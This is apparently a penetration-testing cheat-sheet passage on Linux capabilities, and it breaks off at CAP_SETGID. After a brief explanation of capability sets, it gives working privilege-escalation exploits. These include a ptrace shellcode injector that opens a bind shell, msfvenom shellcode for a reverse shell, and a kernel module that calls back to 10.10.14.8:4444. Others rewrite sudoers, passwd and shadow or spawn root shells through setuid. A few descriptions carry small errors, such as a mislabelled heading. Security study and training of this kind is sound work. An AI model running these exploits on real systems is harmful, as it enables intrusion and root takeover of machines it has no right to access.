# Capabilities

## Theory

Linux capabilities provide a subset of the available root privileges to a process. This effectively breaks up root privileges into smaller and distinctive units. Each of these units can then be independently granted to processes. This way the full set of privileges is reduced, decreasing the risks of exploitation

### Capabilities Sets

Conceptually capabilities are maintained in sets, which are represented as bit masks. For all running processes capability information is maintained per thread; for binaries in the file system it’s stored in extended attributes. Thread capability sets are copied on `fork()` and specially transformed on `execve()`

{% tabs %}
{% tab title="CapEff" %}
**CapEff** is the effective capability set represents all capabilities the process is using at the moment (this is the actual set of capabilities that the kernel uses for permission checks). For file capabilities the effective set is in fact a single bit indicating whether the capabilities of the permitted set will be moved to the effective set upon running a binary. This makes it possible for binaries that are not capability-aware to make use of file capabilities without issuing special system calls.
{% endtab %}

{% tab title="CapPrm" %}
**CapPrm** is a superset of capabilities that the thread may add to either the thread permitted or thread inheritable sets. The thread can use the capset() system call to manage capabilities: It may drop any capability from any set, but only add capabilities to its thread effective and inherited sets that are in its thread permitted set. Consequently it cannot add any capability to its thread permitted set, unless it has the cap\_setpcap capability in its thread effective set.
{% endtab %}

{% tab title="CapInh" %}
**CapInh**, using the inherited set all capabilities that are allowed to be inherited from a parent process can be specified. This prevents a process from receiving any capabilities it does not need. This set is preserved across an execve and is usually set by a process receiving capabilities rather than by a process that’s handing out capabilities to its children.
{% endtab %}

{% tab title="CapBnd" %}
**CapBnd**, With the bounding set it’s possible to restrict the capabilities a process may ever receive. Only capabilities that are present in the bounding set will be allowed in the inheritable and permitted sets.
{% endtab %}

{% tab title="CapAmb" %}
**CapAmb** is the ambient capability set applies to all non-SUID binaries without file capabilities. It preserves capabilities when calling execve. However, not all capabilities in the ambient set may be preserved because they are being dropped in case they are not present in either the inheritable or permitted capability set. This set is preserved across execve calls.
{% endtab %}
{% endtabs %}

## Practice

### Processes Capabilities

{% tabs %}
{% tab title="Enumerate" %}
We can can find the capabilities of a process as follow

```bash
#List current process capabilities
cat /proc/self/status | grep Cap
cat /proc/$$/status | grep Cap
capsh --print

#List capabilities of <PID> process
cat /proc/<PID>/status | grep Cap
```

Using the capsh utility we can decode them into the capabilities name.

```bash
capsh --decode=0000003fffffffff
0x0000003fffffffff=cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,37
```
{% endtab %}
{% endtabs %}

### Binaries Capabilities

{% tabs %}
{% tab title="Enumerate" %}
Binaries can have capabilities that can be used while executing. We can search binaries with capabilities as follow

```bash
getcap -r / 2>/dev/null
```
{% endtab %}

{% tab title="Exploit" %}
If you find that a binary have interesting capabilities, you can check on [GTFOBins](https://gtfobins.github.io/) for known exploits.
{% endtab %}
{% endtabs %}

{% hint style="danger" %}
Having the capability =ep means the binary has all the capabilities
{% endhint %}

### Setcap with SUID/SUDO

{% tabs %}
{% tab title="Enumerate" %}
If you found the `setcap` binary with the SUID bit or with SUDO permissions, you can obtain root access.

```bash
#SUID
$ find / -type f -perm -4000 2>/dev/null
/usr/sbin/setcap

#SUDO
$ sudo -l
    (root) NOPASSWD: /usr/sbin/setcap /home/<user>/*
```
{% endtab %}

{% tab title="Exploit" %}
For example, we can leverage the `CAP_SETUID` capabilities with the `python` binary

```bash
#SUID setcap example
cp /usr/bin/python3 /home/<user>/python3
setcap cap_setuid+ep /home/<user>/python3

#Exploit
/home/<user>/python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
```
{% endtab %}
{% endtabs %}

### Interesting Capabilities

#### CAP\_SYS\_ADMIN

{% tabs %}
{% tab title="Desc" %}
[**CAP\_SYS\_ADMIN**](https://man7.org/linux/man-pages/man7/capabilities.7.html) is largely a catchall capability, it can easily lead to additional capabilities or full root (typically access to all capabilities). `CAP_SYS_ADMIN` is required to perform a range of **administrative operations**, which is difficult to drop from containers if privileged operations are performed within the container.

Retaining this capability is often necessary for containers which mimic entire systems versus individual application containers which can be more restrictive. Among other things this allows to **mount devices** or abuse **release\_agent** to escape from the container.
{% endtab %}

{% tab title="Exploit - Python" %}
For example, if python have the `CAP_SYS_ADMIN` capabilities, we can mount a modified _passwd_ file on top of the real _passwd_ file.

```bash
$ getcap -r / 2>/dev/null
/usr/bin/python2.7 = cap_sys_admin+ep
```

First generate the new passwd file

```bash
cp /etc/passwd ./ #Create a copy of the passwd file
openssl passwd -1 -salt abc password #Get hash of "password"
vim ./passwd #Change roots passwords of the fake passwd file
```

Then we can use the following python script to mount it

```python
from ctypes import *
libc = CDLL("libc.so.6")
libc.mount.argtypes = (c_char_p, c_char_p, c_char_p, c_ulong, c_char_p)
MS_BIND = 4096
source = b"/path/to/fake/passwd"
target = b"/etc/passwd"
filesystemtype = b"none"
options = b"rw"
mountflags = MS_BIND
libc.mount(source, target, filesystemtype, mountflags, options)
```

{% hint style="info" %}
If you are in a docker container and `CAP_SYS_ADMIN` is enabled, then you can escape. See [this page](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/linux-capabilities#cap\_sys\_admin) for more informations.
{% endhint %}
{% endtab %}
{% endtabs %}

#### CAP\_SYS\_PTRACE

{% tabs %}
{% tab title="Desc" %}
[**CAP\_SYS\_PTRACE**](https://man7.org/linux/man-pages/man7/capabilities.7.html) allows to use `ptrace(2)` and recently introduced cross memory attach system calls such as `process_vm_readv(2)` and `process_vm_writev(2)`.

If this capability is granted and the `ptrace(2)` system call itself is not blocked by a seccomp filter, this will allow an attacker to bypass other seccomp restrictions, see [PoC for bypassing seccomp if ptrace is allowed](https://gist.github.com/thejh/8346f47e359adecd1d53).
{% endtab %}

{% tab title="Exploit - Python" %}
For example, if **python** have the `CAP_SYS_PTRACE` capabilities, we can inject a shellcode in a root process memory.

```bash
$ getcap -r / 2>/dev/null
/usr/bin/python2.7 = cap_sys_ptrace+ep
```

We can use the following python code to inject our shellcode

```python
import ctypes
import sys
import struct
# Macros defined in <sys/ptrace.h>
# https://code.woboq.org/qt5/include/sys/ptrace.h.html
PTRACE_POKETEXT = 4
PTRACE_GETREGS = 12
PTRACE_SETREGS = 13
PTRACE_ATTACH = 16
PTRACE_DETACH = 17
# Structure defined in <sys/user.h>
# https://code.woboq.org/qt5/include/sys/user.h.html#user_regs_struct
class user_regs_struct(ctypes.Structure):
    _fields_ = [
        ("r15", ctypes.c_ulonglong),
        ("r14", ctypes.c_ulonglong),
        ("r13", ctypes.c_ulonglong),
        ("r12", ctypes.c_ulonglong),
        ("rbp", ctypes.c_ulonglong),
        ("rbx", ctypes.c_ulonglong),
        ("r11", ctypes.c_ulonglong),
        ("r10", ctypes.c_ulonglong),
        ("r9", ctypes.c_ulonglong),
        ("r8", ctypes.c_ulonglong),
        ("rax", ctypes.c_ulonglong),
        ("rcx", ctypes.c_ulonglong),
        ("rdx", ctypes.c_ulonglong),
        ("rsi", ctypes.c_ulonglong),
        ("rdi", ctypes.c_ulonglong),
        ("orig_rax", ctypes.c_ulonglong),
        ("rip", ctypes.c_ulonglong),
        ("cs", ctypes.c_ulonglong),
        ("eflags", ctypes.c_ulonglong),
        ("rsp", ctypes.c_ulonglong),
        ("ss", ctypes.c_ulonglong),
        ("fs_base", ctypes.c_ulonglong),
        ("gs_base", ctypes.c_ulonglong),
        ("ds", ctypes.c_ulonglong),
        ("es", ctypes.c_ulonglong),
        ("fs", ctypes.c_ulonglong),
        ("gs", ctypes.c_ulonglong),
    ]

libc = ctypes.CDLL("libc.so.6")

pid=int(sys.argv[1])

# Define argument type and respone type.
libc.ptrace.argtypes = [ctypes.c_uint64, ctypes.c_uint64, ctypes.c_void_p, ctypes.c_void_p]
libc.ptrace.restype = ctypes.c_uint64

# Attach to the process
libc.ptrace(PTRACE_ATTACH, pid, None, None)
registers=user_regs_struct()

# Retrieve the value stored in registers
libc.ptrace(PTRACE_GETREGS, pid, None, ctypes.byref(registers))
print("Instruction Pointer: " + hex(registers.rip))
print("Injecting Shellcode at: " + hex(registers.rip))

# Linux/x64 - Bind (5600/TCP) Shell Shellcode (87 bytes)
shellcode =  "\x48\x31\xc0\x48\x31\xd2\x48\x31\xf6\xff\xc6\x6a\x29\x58\x6a\x02\x5f\x0f\x05\x48\x97\x6a\x02\x66\xc7\x44\x24\x02\x15\xe0\x54\x5e\x52\x6a\x31\x58\x6a\x10\x5a\x0f\x05\x5e\x6a\x32\x58\x0f\x05\x6a\x2b\x58\x0f\x05\x48\x97\x6a\x03\x5e\xff\xce\xb0\x21\x0f\x05\x75\xf8\xf7\xe6\x52\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x8d\x3c\x24\xb0\x3b\x0f\x05"

# Inject the shellcode into the running process byte by byte.
for i in range(0,len(shellcode),4):
    # Convert the byte to little endian.
    shellcode_byte_int=int(shellcode[i:4+i].encode('hex'),16)
    shellcode_byte_little_endian=struct.pack("<I", shellcode_byte_int).rstrip('\x00').encode('hex')
    shellcode_byte=int(shellcode_byte_little_endian,16)

    # Inject the byte.
    libc.ptrace(PTRACE_POKETEXT, pid, ctypes.c_void_p(registers.rip+i),shellcode_byte)

print("Shellcode Injected!!")

# Modify the instuction pointer
registers.rip=registers.rip+2

# Set the registers
libc.ptrace(PTRACE_SETREGS, pid, None, ctypes.byref(registers))
print("Final Instruction Pointer: " + hex(registers.rip))

# Detach from the process.
libc.ptrace(PTRACE_DETACH, pid, None, None)

```

Now we can execute, and connect to the bind shell

```bash
#On target host
$ python2.7 ptrace.py <ROOT_PROCESS_PID>

#On attacking host
$ nc TARGET_IP 5600
```

{% hint style="info" %}
If you are in a docker container and`CAP_SYS_PTRACE` is enabled, then it means that you can **escape** the container **by injecting a shellcode** inside some process running inside the **host.** To access processes running inside the host the container needs to be run at least with **`--pid=host`**.\
See[ this page](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/linux-capabilities#cap\_sys\_ptrace) for more informations.
{% endhint %}
{% endtab %}

{% tab title="Exploit - Gdb" %}
Here is **an other PrivEsc example with `gdb`** if it have the `CAP_SYS_PTRACE` enabled

```bash
$ getcap -r / 2>/dev/null
/usr/bin/gdb = cap_sys_ptrace+ep
```

First, create a shellcode with msfvenom and python

```bash
# msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.11 LPORT=9001 -f py -o revshell.py
buf =  b""
buf += b"\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f\x05"
buf += b"\x48\x97\x48\xb9\x02\x00\x23\x29\x0a\x0a\x0e\x0b"
buf += b"\x51\x48\x89\xe6\x6a\x10\x5a\x6a\x2a\x58\x0f\x05"
buf += b"\x6a\x03\x5e\x48\xff\xce\x6a\x21\x58\x0f\x05\x75"
buf += b"\xf6\x6a\x3b\x58\x99\x48\xbb\x2f\x62\x69\x6e\x2f"
buf += b"\x73\x68\x00\x53\x48\x89\xe7\x52\x57\x48\x89\xe6"
buf += b"\x0f\x05"

# Divisible by 8
payload = b"\x90" * (8 - len(buf) % 8 ) + buf

# Change endianess and print gdb lines to load the shellcode in RIP directly
for i in range(0, len(buf), 8):
	chunk = payload[i:i+8][::-1]
	chunks = "0x"
	for byte in chunk:
		chunks += f"{byte:02x}"

	print(f"set {{long}}($rip+{i}) = {chunks}")
```

Then, debug a root process with gdb ad copy-paste the previously generated gdb lines:

```bash
# In this case there was a sleep run by root
## NOTE that the process you abuse will die after the shellcode
/usr/bin/gdb -p $(pgrep sleep)
[...]
(gdb) set {long}($rip+0) = 0x296a909090909090
(gdb) set {long}($rip+8) = 0x5e016a5f026a9958
(gdb) set {long}($rip+16) = 0x0002b9489748050f
(gdb) set {long}($rip+24) = 0x48510b0e0a0a2923
(gdb) set {long}($rip+32) = 0x582a6a5a106ae689
(gdb) set {long}($rip+40) = 0xceff485e036a050f
(gdb) set {long}($rip+48) = 0x6af675050f58216a
(gdb) set {long}($rip+56) = 0x69622fbb4899583b
(gdb) set {long}($rip+64) = 0x8948530068732f6e
(gdb) set {long}($rip+72) = 0x050fe689485752e7
(gdb) c
Continuing.
process 207009 is executing new program: /usr/bin/dash
[...]
```
{% endtab %}
{% endtabs %}

#### CAP\_SYS\_MODULE

{% tabs %}
{% tab title="Desc" %}
[**CAP\_SYS\_MODULE**](https://man7.org/linux/man-pages/man7/capabilities.7.html) allows the process to load and unload arbitrary kernel modules (`init_module(2)`, `finit_module(2)` and `delete_module(2)` system calls).

This could lead to trivial privilege escalation and ring-0 compromise. The kernel can be modified at will, subverting all system security, Linux Security Modules, and container systems.

**This means that you can** **insert/remove kernel modules in/from the kernel of the host machine.**
{% endtab %}

{% tab title="Exploit - Python" %}
In the following example the **`python`** binary has this capability.

```bash
$ getcap -r / 2>/dev/null
/usr/bin/python2.7 = cap_sys_module+ep
```

In order to abuse this, lets create a fake **lib/modules** folder

```bash
mkdir lib/modules -p
cp -a /lib/modules/$(uname -r)/ lib/modules/$(uname -r)
```

**Create** the **kernel module** that is going to execute a reverse shell and the **Makefile** to **compile** it

{% code title="reverse-shell.c" %}
```c
#include <linux/kmod.h>
#include <linux/module.h>
MODULE_LICENSE("GPL");
MODULE_AUTHOR("AttackDefense");
MODULE_DESCRIPTION("LKM reverse shell module");
MODULE_VERSION("1.0");

char* argv[] = {"/bin/bash","-c","bash -i >& /dev/tcp/10.10.14.8/4444 0>&1", NULL};
static char* envp[] = {"PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin", NULL };

// call_usermodehelper function is used to create user mode processes from kernel space
static int __init reverse_shell_init(void) {
    return call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
}

static void __exit reverse_shell_exit(void) {
    printk(KERN_INFO "Exiting\n");
}

module_init(reverse_shell_init);
module_exit(reverse_shell_exit);
```
{% endcode %}

{% code title="Makefile" %}
```c
obj-m +=reverse-shell.o

all:
    make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules

clean:
    make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean
```
{% endcode %}

{% hint style="danger" %}
The blank char before each make word in the Makefile **must be a tab, not spaces**!
{% endhint %}

We can compile it using our `Makefile` and the `make` command

```bash
make
```

{% hint style="danger" %}
If you can't find the /lib/modules/\<version>/build folder, this is because you have not download the linux headers of your kernel version
{% endhint %}

Finally, we can execute this python code

```bash
#On target machine
$ cat exploit.py
import kmod
km = kmod.Kmod()
km.set_mod_dir("/path/to/fake/lib/modules/5.0.0-20-generic/")
km.modprobe("reverse-shell")

$ python exloit.py

#On attacking machine 
nc -lvnp 4444
```
{% endtab %}

{% tab title="Exploit -  kmod" %}
In the following example the **`kmod`** binary has this capability.

```bash
getcap -r / 2>/dev/null
/bin/kmod = cap_sys_module+ep
```

It means that it's possible to use the command **`insmod`** to insert a kernel module. We can use the same `C` code seen in the previous example to get a **reverse shell** abusing this privilege.

{% code title="reverse-shell.c" %}
```c
#include <linux/kmod.h>
#include <linux/module.h>
MODULE_LICENSE("GPL");
MODULE_AUTHOR("AttackDefense");
MODULE_DESCRIPTION("LKM reverse shell module");
MODULE_VERSION("1.0");

char* argv[] = {"/bin/bash","-c","bash -i >& /dev/tcp/10.10.14.8/4444 0>&1", NULL};
static char* envp[] = {"PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin", NULL };

// call_usermodehelper function is used to create user mode processes from kernel space
static int __init reverse_shell_init(void) {
    return call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
}

static void __exit reverse_shell_exit(void) {
    printk(KERN_INFO "Exiting\n");
}

module_init(reverse_shell_init);
module_exit(reverse_shell_exit);
```
{% endcode %}

{% code title="Makefile" %}
```bash
obj-m +=reverse-shell.o

all:
    make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules

clean:
    make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean
```
{% endcode %}

{% hint style="danger" %}
The blank char before each make word in the Makefile **must be a tab, not spaces**!
{% endhint %}

We can compile it using our `Makefile` and the `make` command

```bash
make
```

{% hint style="danger" %}
If you can't find the /lib/modules/\<version>/build folder, this is because you have not download the linux headers of your kernel version
{% endhint %}

Finally, load the module using `insmode`

```bash
#On target machine
insmod reverse-shell.ko #Launch the reverse shell

#On attacking machine
nc -lvnp 4444
```
{% endtab %}
{% endtabs %}

#### CAP\_DAC\_READ\_SEARCH

{% tabs %}
{% tab title="Desc" %}
[**CAP\_DAC\_READ\_SEARCH**](https://man7.org/linux/man-pages/man7/capabilities.7.html) allows a process to **bypass file read, and directory read and execute permissions**. While this was designed to be used for searching or reading files, it also grants the process permission to invoke `open_by_handle_at(2)`.

Any process with the capability `CAP_DAC_READ_SEARCH` can use `open_by_handle_at(2)` to gain access to any file, even files outside their mount namespace. The handle passed into `open_by_handle_at(2)` is intended to be an opaque identifier retrieved using `name_to_handle_at(2)`. However, this handle contains sensitive and tamperable information, such as inode numbers. This was first shown to be an issue in Docker containers by Sebastian Krahmer with [shocker](https://medium.com/@fun\_cuddles/docker-breakout-exploit-analysis-a274fff0e6b3) exploit.

**This means that you can** **bypass can bypass file read permission checks and directory read/execute permission checks.**
{% endtab %}

{% tab title="Exploit - Python" %}
In the following example the **`python`** binary has this capability.

```bash
$ getcap -r / 2>/dev/null
/usr/bin/python3.11 = cap_dac_read_search+ep
```

We can abuse it to read the `/etc/shadow` file

```bash
$ cat exploit.py
print(open("/etc/shadow", "r").read())

$ python3.11 exploit.py
```
{% endtab %}

{% tab title="Exploit - Tar" %}
In the following example the **`tar`** binary has this capability.

```bash
$ getcap -r / 2>/dev/null
/usr/bin/tar = cap_dac_read_search+ep
```

We can abuse it to read the `/etc/shadow` file

```bash
LFILE=/etc/shadow
tar xf "$LFILE" -I '/bin/sh -c "cat 1>&2"'
```

Alternatively, we can do as follow

```bash
cd /etc
tar -czf /tmp/shadow.tar.gz shadow #Compress show file in /tmp
cd /tmp
tar -cxf shadow.tar.gz
```
{% endtab %}
{% endtabs %}

#### CAP\_DAC\_OVERRIDE

{% tabs %}
{% tab title="Desc" %}
[**CAP\_DAC\_OVERRIDE**](https://man7.org/linux/man-pages/man7/capabilities.7.html) allows to ignore the permission bits of files. With this capability, you can modify any file like `passwd`, `sudoers` or `shadow` to obtain root access.

**This mean that you can bypass write permission checks on any file, so you can write any file.**
{% endtab %}

{% tab title="Exploit - Python" %}
In the following example the **`python`** binary has this capability.

```bash
$ getcap -r / 2>/dev/null
/usr/bin/python3.11 = cap_dac_override+ep
```

We can abuse it to override the `/etc/sudoer` file

```bash
$ cat exploit.py
file=open("/etc/sudoers","a")
file.write("yourusername ALL=(ALL) NOPASSWD:ALL")
file.close()

$ python3 exploit.py
```

We can now spawn an elevated shell

```bash
$ sudo /bin/bash
#or
$ sudo su
```

**Alternatively**, we can overwritte the `/etc/passwd` file. First we have to generate a new password hash

```bash
#Using mkpasswd
$ mkpasswd  -m sha-512 -S saltsalt -s
Mot de passe : password1
$6$saltsalt$rGHbrrsOT1WLTt4dcfZKq1FiG//1B7ZAMkD.MeAC8/d9MOtB5EzYEffFnBarQhF6MiLywY/KggaYjrNNrzAnj/

#Or with openssl
$ openssl passwd -6 password1
$6$5h9QsTjUEHVIFVwK$3MkSX5prCEkZax7z5ixV1hdmAghcAGTjX2gAyMFjcAYxYQ00H7xQvskRRi/y.0ouz0sRpqGUWzORK0MdAGv7b0
```

Then, use the following script to edit the `/etc/passwd` file

```bash
$ cat exploit.py

import sys

password = sys.argv[1]

contents = []
with open("/etc/passwd") as file:
    for line in file:
        if line.startswith("root"):
            contents.append(line.replace(":x:", ":%s:" % password))
        else:
            contents.append(line)
    pass

with open("/etc/passwd", "w") as file:
    file.writelines(contents)

print("done")

$ python3.11 exploit.py '$6$saltsalt$rGHbrrsOT1WLTt4dcfZKq1FiG//1B7ZAMkD.MeAC8/d9MOtB5EzYEffFnBarQhF6MiLywY/KggaYjrNNrzAnj/'
$ head -n1 /etc/passwd
root:$6$saltsalt$rGHbrrsOT1WLTt4dcfZKq1FiG//1B7ZAMkD.MeAC8/d9MOtB5EzYEffFnBarQhF6MiLywY/KggaYjrNNrzAnj/:0:0:root:/root:/usr/bin/zsh
```

We can now easily `su` as root

```bash
su - root
```
{% endtab %}

{% tab title="Exploit Vim" %}
In the following example the **`vim`** binary has this capability.

```bash
$ getcap -r / 2>/dev/null
/usr/bin/vim = cap_dac_override+ep
```

We can abuse it to override the `/etc/shadow` file. First we can generate a new password hash

```bash
#Using mkpasswd
$ mkpasswd  -m sha-512 -S saltsalt -s
Mot de passe : password1
$6$saltsalt$rGHbrrsOT1WLTt4dcfZKq1FiG//1B7ZAMkD.MeAC8/d9MOtB5EzYEffFnBarQhF6MiLywY/KggaYjrNNrzAnj/

#Or with openssl
$ openssl passwd -6 password1
$6$5h9QsTjUEHVIFVwK$3MkSX5prCEkZax7z5ixV1hdmAghcAGTjX2gAyMFjcAYxYQ00H7xQvskRRi/y.0ouz0sRpqGUWzORK0MdAGv7b0
```

Now we can just vim the /etc/passwd file and replace the root hash by the generated one

```bash
$ vim /etc/shadow
$ head -n1 /etc/shadow
root:$6$saltsalt$rGHbrrsOT1WLTt4dcfZKq1FiG//1B7ZAMkD.MeAC8/d9MOtB5EzYEffFnBarQhF6MiLywY/KggaYjrNNrzAnj/:17673:0:99999:7:::
```

We can now easily `su` as root

```bash
su - root
```
{% endtab %}
{% endtabs %}

#### CAP\_CHOWN

{% tabs %}
{% tab title="Desc" %}
[**CAP\_CHOWN**](https://man7.org/linux/man-pages/man7/capabilities.7.html) allow us to make arbitrary changes to file UIDs and GIDs.

**This means that it's possible to change the ownership of any file.**
{% endtab %}

{% tab title="Exploit - Python" %}
In the following example the **`python`** binary has this capability.

```bash
$ getcap -r / 2>/dev/null
/usr/bin/python3.11 = cap_chown+ep
```

We can abuse it to modify the file owner of the `/etc/shadow` file or the `/root`. First we can check what is our current user id

```bash
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Replace the attribute numbers with the current user id.

```bash
#Get /etc/shadow
$ python -c 'import os;os.chown("/etc/shadow",33,33)'

#Get /root directory
$ python -c 'import os;os.chown("/root",33,33)'
```

We can now generate a new hash

```bash
#Using mkpasswd
$ mkpasswd  -m sha-512 -S saltsalt -s
Mot de passe : password1
$6$saltsalt$rGHbrrsOT1WLTt4dcfZKq1FiG//1B7ZAMkD.MeAC8/d9MOtB5EzYEffFnBarQhF6MiLywY/KggaYjrNNrzAnj/

#Or with openssl
$ openssl passwd -6 password1
$6$5h9QsTjUEHVIFVwK$3MkSX5prCEkZax7z5ixV1hdmAghcAGTjX2gAyMFjcAYxYQ00H7xQvskRRi/y.0ouz0sRpqGUWzORK0MdAGv7b0
```

And edit the `/etc/shadow` file to change the root password

```bash
#Replace the hash
$ vim /etc/shadow
$ head -n1 /etc/shadow
root:$6$saltsalt$rGHbrrsOT1WLTt4dcfZKq1FiG//1B7ZAMkD.MeAC8/d9MOtB5EzYEffFnBarQhF6MiLywY/KggaYjrNNrzAnj/:17673:0:99999:7:::
```

We can now easily `su` as root

```bash
su - root
```
{% endtab %}

{% tab title="Exploit - Ruby" %}
In the following example the **`ruby`** binary has this capability.

```bash
$ getcap -r / 2>/dev/null
/usr/bin/ruby = cap_chown+ep
```

We can abuse it to modify the file owner of the `/etc/shadow` file or the `/root` directory. First we can check what is our current user id

```bash
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Replace the attribute numbers with the current user id.

```bash
#Get /etc/shadow
$ ruby -e 'require "fileutils"; FileUtils.chown(33, 33, "/etc/shadow")'

#Get /root directory
$ ruby -e 'require "fileutils"; FileUtils.chown(33, 33, "/root")'
```

We can now generate a new hash

```bash
#Using mkpasswd
$ mkpasswd  -m sha-512 -S saltsalt -s
Mot de passe : password1
$6$saltsalt$rGHbrrsOT1WLTt4dcfZKq1FiG//1B7ZAMkD.MeAC8/d9MOtB5EzYEffFnBarQhF6MiLywY/KggaYjrNNrzAnj/

#Or with openssl
$ openssl passwd -6 password1
$6$5h9QsTjUEHVIFVwK$3MkSX5prCEkZax7z5ixV1hdmAghcAGTjX2gAyMFjcAYxYQ00H7xQvskRRi/y.0ouz0sRpqGUWzORK0MdAGv7b0
```

And edit the `/etc/shadow` file to change the root password

```bash
#Replace the hash
$ vim /etc/shadow
$ head -n1 /etc/shadow
root:$6$saltsalt$rGHbrrsOT1WLTt4dcfZKq1FiG//1B7ZAMkD.MeAC8/d9MOtB5EzYEffFnBarQhF6MiLywY/KggaYjrNNrzAnj/:17673:0:99999:7:::
```

We can now easily `su` as root

```bash
su - root
```
{% endtab %}
{% endtabs %}

#### CAP\_FOWNER

{% tabs %}
{% tab title="Desc" %}
[**CAP\_CHOWN**](https://man7.org/linux/man-pages/man7/capabilities.7.html) allow us to bypass permission checks on operations that normally require the filesystem UID of the process to match the UID of the file. excluding those operations covered by `CAP_DAC_OVERRIDE` and `CAP_DAC_READ_SEARCH`. Additionally it allow us to set inode flags, ACLs on arbitrary files, ignore the directory sticky bit on file deletion.

**This means that it's possible to change the permission of any file.**
{% endtab %}

{% tab title="Exploit - Python" %}
In the following example the **`python`** binary has this capability.

```bash
$ getcap -r / 2>/dev/null
/usr/bin/python3.11 = cap_fowner+ep
```

We can abuse it to modify the file permissions of the `/etc/shadow`. First generate a new hash

```bash
#Using mkpasswd
$ mkpasswd  -m sha-512 -S saltsalt -s
Mot de passe : password1
$6$saltsalt$rGHbrrsOT1WLTt4dcfZKq1FiG//1B7ZAMkD.MeAC8/d9MOtB5EzYEffFnBarQhF6MiLywY/KggaYjrNNrzAnj/

#Or with openssl
$ openssl passwd -6 password1
$6$5h9QsTjUEHVIFVwK$3MkSX5prCEkZax7z5ixV1hdmAghcAGTjX2gAyMFjcAYxYQ00H7xQvskRRi/y.0ouz0sRpqGUWzORK0MdAGv7b0
```

Give us permissions over the `/etc/shadow` file

```bash
$ python -c 'import os;os.chmod("/etc/shadow",0666)
```

And edit the `/etc/shadow` file to change the root password

```bash
#Replace the hash
$ vim /etc/shadow
$ head -n1 /etc/shadow
root:$6$saltsalt$rGHbrrsOT1WLTt4dcfZKq1FiG//1B7ZAMkD.MeAC8/d9MOtB5EzYEffFnBarQhF6MiLywY/KggaYjrNNrzAnj/:17673:0:99999:7:::
```

We can now easily `su` as root

```bash
su - root
```
{% endtab %}

{% tab title="Exploit - Ruby" %}
In the following example the **`ruby`** binary has this capability.

```bash
$ getcap -r / 2>/dev/null
/usr/bin/ruby = cap_fowner+ep
```

We can abuse it to modify the file permissions of the `/etc/shadow`. First generate a new hash

```bash
#Using mkpasswd
$ mkpasswd  -m sha-512 -S saltsalt -s
Mot de passe : password1
$6$saltsalt$rGHbrrsOT1WLTt4dcfZKq1FiG//1B7ZAMkD.MeAC8/d9MOtB5EzYEffFnBarQhF6MiLywY/KggaYjrNNrzAnj/

#Or with openssl
$ openssl passwd -6 password1
$6$5h9QsTjUEHVIFVwK$3MkSX5prCEkZax7z5ixV1hdmAghcAGTjX2gAyMFjcAYxYQ00H7xQvskRRi/y.0ouz0sRpqGUWzORK0MdAGv7b0
```

Give us permissions over the `/etc/shadow` file

```bash
$ ruby -e 'require "fileutils"; FileUtils.chmod(0666, "/etc/shadow")'
```

And edit the `/etc/shadow` file to change the root password

```bash
#Replace the hash
$ vim /etc/shadow
$ head -n1 /etc/shadow
root:$6$saltsalt$rGHbrrsOT1WLTt4dcfZKq1FiG//1B7ZAMkD.MeAC8/d9MOtB5EzYEffFnBarQhF6MiLywY/KggaYjrNNrzAnj/:17673:0:99999:7:::
```

We can now easily `su` as root

```bash
su - root
```
{% endtab %}
{% endtabs %}

#### CAP\_SETUID

{% tabs %}
{% tab title="Desc" %}
[**CAP**](https://man7.org/linux/man-pages/man7/capabilities.7.html)[**\_SETUID**](https://man7.org/linux/man-pages/man7/capabilities.7.html) allow us to make arbitrary manipulations of process UIDs (`setuid(2)`, `setreuid(2)`, `setresuid(2)`, `setfsuid(2)`);

**This means that it's possible to set the effective user id of the created process.**
{% endtab %}

{% tab title="Exploit - Python" %}
In the following example the **`python`** binary has this capability.

```bash
$ getcap -r / 2>/dev/null
/usr/bin/python3.11 = cap_setuid+ep
```

We can abuse it to spawn an elevated shell

```bash
$ python -c 'import os; os.setuid(0); os.system("/bin/bash")'
```
{% endtab %}

{% tab title="Exploit - Ruby" %}
In the following example the **`ruby`** binary has this capability.

```bash
$ getcap -r / 2>/dev/null
/usr/bin/ruby = cap_setuid+ep
```

We can abuse it to spawn an elevated shell

```bash
$ ruby -e 'Process::Sys.setuid(0); exec "/bin/sh"'
```
{% endtab %}

{% tab title="Exploit - Perl" %}
In the following example the **`perl`** binary has this capability.

```bash
$ getcap -r / 2>/dev/null
/usr/bin/perl = cap_setuid+ep
```

We can abuse it to spawn an elevated shell

```bash
$ perl -e 'use POSIX (setuid); POSIX::setuid(0); exec "/bin/bash";'
```
{% endtab %}

{% tab title="Exploit - PHP" %}
In the following example the **`php`** binary has this capability.

```bash
$ getcap -r / 2>/dev/null
/usr/bin/php8.2 = cap_setuid+ep
```

We can abuse it to spawn an elevated shell

```bash
$ php -r "posix_setuid(0); system('/bin/bash');"
```
{% endtab %}
{% endtabs %}

#### CAP\_SETGID

{% tabs %}
{% tab title="Desc" %}
[**CAP\_SETGID**](https://man7.org/linux/man-pages/man7/capabilities.7.html) allow us to make arbitrary manipulations of process GIDs and supplementary GID list.

